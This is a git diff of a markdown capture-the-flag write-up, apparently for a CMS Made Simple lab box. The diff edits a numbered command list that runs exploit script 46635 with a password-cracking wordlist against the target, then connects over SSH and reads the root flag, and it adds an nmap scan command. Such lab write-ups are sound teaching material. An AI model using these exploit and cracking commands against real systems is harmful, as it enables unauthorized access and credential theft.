@@ -287,9 +287,9 @@ W3ll d0n3. You made it!
 8. `cd ~/Downloads`
 9. `ls`
 10. `python 46635`
-11. `gedit python 46635`
-12. `python 46635`
-13. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+11. `gedit 46635`
+12. `python3 46635`
+13. `python3 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
 14. `gedit 46635`
 15. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
 16. `ssh {USERNAME}@{TARGET IP} -p 2222`
@@ -305,7 +305,12 @@ W3ll d0n3. You made it!
 26. `cat {ROOT TEXT FILE}`
 
 # Dissecting Some Commands
-> Step
+`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
++
+
+
+`python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
++
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
